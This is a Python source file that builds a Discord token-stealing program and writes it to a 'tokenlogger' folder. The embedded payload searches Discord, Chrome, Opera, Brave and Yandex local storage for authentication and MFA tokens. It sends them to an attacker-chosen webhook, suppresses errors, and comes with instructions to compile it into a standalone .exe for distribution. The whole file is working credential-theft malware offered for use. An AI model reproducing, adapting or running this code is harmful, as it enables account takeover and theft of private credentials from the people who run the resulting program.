import os
from colorama import Fore

FILE_CONTENT = """import os
import re
import json
from urllib.request import Request, urlopen

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone'

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'```**{platform}**```'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}'
        else:
            message += 'No tokens found.'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass"""


class Create:
    def __init__(self, webhook_url):
        # Create a new file inside a folder called tokenlogger
        print("[*] Creating tokenlogger.py...")
        # Create a directory called tokenlogger
        if not os.path.exists("tokenlogger"):
            os.mkdir("tokenlogger")
        # Create a new file called tokenlogger.py
        with open("tokenlogger/tokenlogger.py", "w") as f:
            # Write the content of the file
            f.write(FILE_CONTENT.replace("WEBHOOK_URL", f"'{webhook_url}'"))
            print(Fore.GREEN + "[*] Successfully created tokenlogger.py")
            f.close()
            print(Fore.GREEN + "[*] To make it as .exe file, run the following command: pyinstaller --onefile tokenlogger.py")
